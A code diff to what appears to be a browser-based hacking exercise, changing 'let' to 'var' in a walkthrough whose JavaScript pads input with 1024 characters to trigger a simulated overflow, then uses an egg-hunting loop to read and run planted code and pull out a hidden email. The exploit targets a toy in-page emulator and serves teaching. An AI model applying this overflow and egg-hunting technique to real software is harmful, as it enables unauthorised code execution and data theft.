@@ -144,8 +144,8 @@ print(send(prefix("read(5)('this is the second request')")));
                         <li>Use the following code to extract the email, but also use it to understand what is going on and the beauty of a egg hunting strategy when using overflows.</li>
 <pre>
 // Define some support functions
-let prefix = function(str) { return "a".repeat(1024) + str };
-let run = function(str) { return send(prefix(str))};
+var prefix = function(str) { return "a".repeat(1024) + str };
+var run = function(str) { return send(prefix(str))};
 
 // 1. Figure out the global function id of the write function
 var writeNo;
@@ -183,9 +183,9 @@ send(egg);
 
 // 5. Use a egg_hunting strategy to find the code that we should execute
 print("Email to leader: " + run(`
-let r=read
-let w=r(`+writeNo+`)
-let e=r(`+execNo+`)
+var r=read
+var w=r(`+writeNo+`)
+var e=r(`+execNo+`)
 for(var i=0;;i++) {
     if(""+r(i)+r(i+1)=="$%") {
         w(e(i+2,i+` + egg.length + `))
@@ -247,8 +247,8 @@ print(response);
                     return "unsupported SQL statement"
                 }
             })()
-            let exec = function(start, end) {
-                let estr = ""         
+            var exec = function(start, end) {
+                var estr = ""         
                 if(end === undefined) {
                     estr = start
                 } else {
@@ -282,7 +282,8 @@ print(response);
             function exec(code) {
                 var resp = ""
                 try {
-                    memory[5] = function(str) { resp += str; throw "return" }
+                    var systemv_nwr = function(str) { resp += str; throw "return" }
+                    memory[5] = function(str) { return systemv_nwr(str) }
                     var userF = new Function('read', '"use strict";' + code)
                     userF = userF.bind({})
                     userF(function(index) { return memory[index]})
